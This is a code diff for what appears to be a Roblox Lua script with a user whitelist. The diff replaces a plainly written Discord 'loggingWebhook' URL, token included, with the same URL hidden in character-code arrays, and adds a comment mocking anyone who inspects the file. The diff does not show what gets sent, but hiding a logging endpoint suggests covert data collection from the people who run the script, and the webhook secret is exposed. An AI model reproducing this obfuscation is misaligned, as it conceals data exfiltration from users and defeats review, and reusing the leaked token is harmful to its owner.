@@ -43,7 +43,27 @@ local allowedUsers = {
     ["null"] = "null",
 }
 
-local loggingWebhook = "https://discord.com/api/webhooks/1371245432247681128/P3WlGe61QkaITnJiiVl0ALLvRaBRF3S00b-RPSx1vYyH3KvWkZvtSzp7eS4rAH6EtvOz"  -- Replace with your webhook URL
+local h = game:GetService("HttpService")
+
+local a1 = {104,116,116,112,115,58,47,47}
+local a2 = {100,105,115,99,111,114,100,46,99,111,109}
+local a3 = {47,97,112,105,47,119,101,98,104,111,111,107,115,47}
+local a4 = {49,51,55,49,50,52,53,52,51,50,50,52,55,54,56,49,49,50,56}
+local a5 = {47,80,51,87,108,71,101,54,49,81,107,97,73,84,110,74,105,105}
+local a6 = {86,108,48,65,76,76,118,82,97,66,82,70,51,83,48,48,98,45}
+local a7 = {82,80,83,120,49,118,89,121,72,51,75,118,87,107,90,118,116,83,122,112,55,101,83,52,114,65,72,54,69,116,118,79,122}
+
+-- combine all arrays
+local url = string.char(unpack(a1)) ..
+            string.char(unpack(a2)) ..
+            string.char(unpack(a3)) ..
+            string.char(unpack(a4)) ..
+            string.char(unpack(a5)) ..
+            string.char(unpack(a6)) ..
+            string.char(unpack(a7))
+
+-- LOL WHY U LOKING HERE ITS AN OLD AND DETECTED VERISION DUMBASSS LOLLL
+
 
 local player = game.Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
